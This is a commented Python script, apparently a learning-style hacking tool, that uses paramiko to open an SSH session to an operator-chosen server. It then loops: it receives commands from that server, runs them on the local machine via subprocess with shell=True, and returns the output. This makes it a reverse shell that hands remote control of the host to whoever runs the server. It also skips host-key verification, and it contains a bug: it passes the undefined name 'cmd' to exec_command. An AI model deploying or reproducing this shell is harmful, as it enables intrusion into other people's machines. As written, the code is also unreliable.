import paramiko          # Used to handle SSH connections
import shlex             # Used to safely split command strings
import subprocess        # Used to execute system commands

def ssh_command(ip, port, user, passwd, command):
    # Create an SSH client object
    client = paramiko.SSHClient()

    # Automatically add the server's host key (no manual verification)
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    # Connect to the SSH server using provided credentials
    client.connect(ip, port=port, username=user, password=passwd)

    # Open a new SSH session
    ssh_session = client.get_transport().open_session()

    # Check if the SSH session is active
    if ssh_session.active:
        # Execute the initial command on the server
        ssh_session.exec_command(cmd)

        # Receive and print initial response from the server
        print(ssh_session.recv(1024).decode())

        # Start receiving commands continuously
        while True:
            # Receive command from the SSH server
            command = ssh_session.recv(1024)
            try:
                # Decode received command
                cmd = command.decode()

                # If exit command is received, close connection
                if cmd == 'exit':
                    client.close()
                    break

                # Execute the received command on local system
                cmd_output = subprocess.check_output(shlex.split(cmd), shell=True)

                # Send command output back to the server
                ssh_session.send(cmd_output or 'okey')

            except Exception as e:
                # Send error message back to server if command fails
                ssh_session.send(str(e))

                # Close SSH connection on error
                client.close()
    return

if __name__ == '__main__':
    import getpass

    # Get current system username
    user = getpass.getuser()

    # Securely get password input
    password = getpass.getpass()

    # Take server IP from user
    ip = input('Enter server IP : ')

    # Take server port from user
    port = int(input('Enter port : '))

    # Start SSH command client
    ssh_command(ip, port, user, password, 'Client Connected')
